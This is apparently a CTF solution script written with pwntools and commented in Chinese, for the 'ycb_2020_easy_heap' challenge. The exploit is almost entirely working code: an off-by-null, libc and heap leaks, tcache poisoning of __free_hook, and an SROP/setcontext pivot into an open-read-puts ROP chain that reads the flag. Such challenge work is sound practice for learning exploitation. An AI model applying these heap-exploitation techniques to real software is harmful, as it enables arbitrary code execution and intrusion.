#!/usr/bin/python3
from pwn import *
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 28920
elfpath = './ycb_2020_easy_heap_patched'
ldpath = '/home/leo/tools/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so'
# 本地调试用的libc: 2.31-0ubuntu9.2_amd64
# libcpath = '/home/leo/tools/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so'
libcpath = '/home/leo/tools/glibc-all-in-one/libs/libc-2.30.so'
e = ELF(elfpath)
context.binary = e
libc = ELF(libcpath)

context.binary = e # 自动识别context.arch、context.os

if args.LOCAL:
    # p = process([ldpath, e.path], env = {'LD_PRELOAD': libcpath})
    p = process([e.path])
    # gdb.attach(p)
else:
    p = remote(host, port)

# io


def s(c): return p.send(c)
def sl(c): return p.sendline(c)
def r(n): return p.recv(n)
def rn(n): return p.recvn(n)
def ru(pattern, drop=False): return p.recvuntil(pattern, drop=drop)
def rl(): return p.recvline()
def ru7f(): return p.recvuntil(b'\x7f')
def su(x): return p.success(x)
def shell(): return p.interactive()

# utilities


def leak(func, address): return p.success("{} ==> {}".format(func, hex(address)))


def command(c):
    ru(b"Choice:")
    sl(str(c).encode())


def add(size):
    command(1)
    ru(b'Size: ')
    sl(str(size).encode())


def edit(index, content):
    command(2)
    ru(b'Index: ')
    sl(str(index).encode())
    ru(b'Content: ')
    s(content)


def free(index):
    command(3)
    ru(b'Index: ')
    sl(str(index).encode())


def show(index):
    command(4)
    ru(b'Index: ')
    sl(str(index).encode())


# start pwning
'''
ubuntu20
有个off by null
leak可以泄露
ubuntu20，所以用的是glibc2.31?
先贴个博客：https://blog.wjhwjhn.com/archives/290/
prctl沙箱：https://www.anquanke.com/post/id/186447
限制了execve
只允许o/r/w操作
'''

add(0x410) # id 0, skip tcache
add(0x18)  # 1
add(0x18)  # 2

# off by null，所以这里选择分配0x100大小的chunk
for i in range(11):
    add(0xf8) # 3 ~ 13, size: 0x100

free(0)
add(0x410)
show(0)
leak_addr = u64(ru7f()[-6:]+b'\x00'*2)
libc.address = leak_addr - 96 - 0x10 - libc.sym["__malloc_hook"]
leak("base", libc.address)

free(1)
free(2)
add(0x18) # 1
add(0x18) # 2

show(1)
ru(b"Content: ")
heap_addr = u64(r(6) + b"\x00"*2) - 0x6c0 # 0x290 + 0x420 + 0x10
leak("heap", heap_addr)

# off by null & trigger unlink

# 填满tcache
for i in range(7):
    free(3+i)

chunk11 = heap_addr + 0x6c0 + 0x30 + 0x100*8
pld1 = p64(chunk11+0x20-0x18) + p64(chunk11+0x20-0x10) + p64(chunk11)
pld1 = pld1.ljust(0xf0, b'\x00') + p64(0x100)
edit(11, pld1)

free(12)

# 清空tcache
for i in range(7):
    add(0xf8) # id 3~9

add(0xf8) # id 12（与id11 相同）
add(0xf8) # id 14
add(0xf8) # id 15

# 从这里开始，我们得到了两个指向同一个chunk的指针，所以就可以通过tcache poison来实现任意地址chunk分配了
free(10)
free(12)
edit(11, p64(libc.sym["__free_hook"])) # tcache 不会对目标处的chunk结构做检查
add(0xf8) # id 10, 注意，这里变成10和11是一样的了
add(0xf8) # id 12, 分配到了 __free_hook （因为是tcache，所以chunk13的men部分就是从__free_hook开始的，下面同理）



free(13)
free(10)
edit(11, p64(libc.sym["__free_hook"] + 0xf8)) # tcache 不会对目标处的chunk结构做检查
add(0xf8) # id 13
add(0xf8) # id 13, 分配到了 __free_hook +0xf8

# 接下来开始srop
# SROP的目的是什么？为什么这里要用到SROP
# 我的想法：srop 只是一个控制rsp的手段吧？
pop_rdi_ret = 0x26bb2 + libc.address
pop_rsi_ret = 0x2709c + libc.address
pop_rdx_r12_ret = 0x11c421 + libc.address
gadget = 0x0000000000154b90 + libc.address # mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
# 0x7f0f8e19303d <setcontext+61>:      mov    rsp,QWORD PTR [rdx+0xa0] 开始恢复上下文

fake_addr = libc.sym["__free_hook"] + 0x10
sframe = SigreturnFrame()
sframe.rax = 0                       # 
sframe.rdi = fake_addr + 0xf8
sframe.rsp = fake_addr + 0xf8 + 0x10 # 指向后面构造的rop链
sframe.rip = pop_rdi_ret + 1         # ret 开始rop

sframe_data = bytes(sframe).ljust(0xf8, b"\x00")
print(bytes(sframe))

rop_data = p64(libc.sym["open"])
rop_data += p64(pop_rdx_r12_ret) + p64(0x100) + p64(0)
rop_data += p64(pop_rdi_ret) + p64(3) # 3 是打开的文件描述符 (0,1,2之后)
rop_data += p64(pop_rsi_ret) + p64(fake_addr + 0x200)
rop_data += p64(libc.sym["read"])
rop_data += p64(pop_rdi_ret) + p64(fake_addr + 0x200)
rop_data += p64(libc.sym["puts"])

# print(len(rop_data))

pld2 = p64(gadget) + p64(fake_addr)
pld2 += sframe_data[:0x20]
pld2 += p64(libc.sym['setcontext'] + 61)
pld2 += sframe_data[0x28:]
pld2 += b"flag".ljust(8, b"\x00")
pld2 += p64(0)
pld2 += rop_data
# print(len(pld2))

edit(12, pld2[:0xf8])
edit(13, pld2[0xf8:])
if args.LOCAL:
    gdb.attach(p, "b free\nc")

free(12)

# sframe.

shell()

'''
感想：
以我目前的水平来说，我觉得非常难
其实前面的堆部分倒还好，我觉得难点反而是理解后面的SROP和栈布置是怎么想到的。
看懂解法+自己调试就花了可能2~3个小时...
后续有时间写篇复现wp。
又找到一篇大佬博客：https://nuoye-blog.github.io/2020/09/12/d71d6ff7/
'''
